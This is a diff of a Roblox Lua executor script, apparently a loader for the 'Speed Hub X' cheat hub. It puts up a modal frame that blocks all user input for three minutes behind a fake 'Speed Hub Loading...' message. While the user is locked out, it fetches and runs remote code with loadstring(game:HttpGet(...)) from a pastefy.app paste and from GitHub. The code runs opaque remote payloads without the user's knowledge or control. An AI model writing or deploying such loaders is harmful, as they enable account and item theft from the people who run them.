@@ -46,19 +46,25 @@ local function blockUserInput(duration)
     blockFrame.BackgroundTransparency = 1
     blockFrame.Text = ""
     blockFrame.AutoButtonColor = false
-    blockFrame.Modal = true -- this captures all input
+    blockFrame.Modal = true -- capture all input
 
     task.delay(duration, function()
         inputBlocker:Destroy()
     end)
 end
 
---// Start Input Block and UI
-blockUserInput(180) -- Block input for 3 minutes
-local loadingUI, label = createFramedMessage("ExecutorLoading", 280, 80, "Speed Hub Loading...")
-task.wait(2)
-label.Text = "Script Running..."
+--// Begin
+blockUserInput(180) -- 3 minutes
 
---// Run your scripts while UI block is active
-loadstring(game:HttpGet("https://pastefy.app/s10gfCIh/raw"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+local loadingUI, label = createFramedMessage("ExecutorLoading", 280, 80, "Speed Hub Loading...")
+task.wait(1)
+label.Text = "Executing scripts..."
+
+--// Immediately run your scripts while user is blocked
+pcall(function()
+    loadstring(game:HttpGet("https://pastefy.app/s10gfCIh/raw"))()
+end)
+
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+end)
